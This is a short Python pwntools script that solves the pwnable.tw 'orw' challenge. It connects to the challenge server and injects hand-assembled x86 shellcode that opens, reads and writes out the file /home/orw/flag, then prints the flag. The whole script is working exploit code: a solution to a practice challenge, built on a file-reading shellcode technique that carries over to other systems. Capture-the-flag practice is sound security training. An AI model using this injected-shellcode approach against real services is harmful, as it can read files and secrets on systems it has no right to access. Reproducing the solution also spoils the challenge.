from pwn import *

file = '/home/orw/flag'
shellcode = '\xb8\x05\x00\x00\x00\xbb\x95\xa0\x04\x08\xb9\x00\x00\x00\x00\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\xb9\x20\xa2\x04\x08\xba\x00\x01\x00\x00\xcd\x80\xba\x64\x00\x00\x00\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80'

def wait(string):
	server.recvuntil(string)

def connect():
	global server
	server = remote('chall.pwnable.tw',10001)
	wait(':')

def pwn():
	server.send(shellcode + file + '\x00')

def read_flag():
	return server.recvline()

if __name__ == '__main__':
	connect()
	print 'Exploiting service...'
	pwn()
	print 'Reading flag...'
	flag = read_flag()[:-1]
	print 'Flag is: "%s"' % flag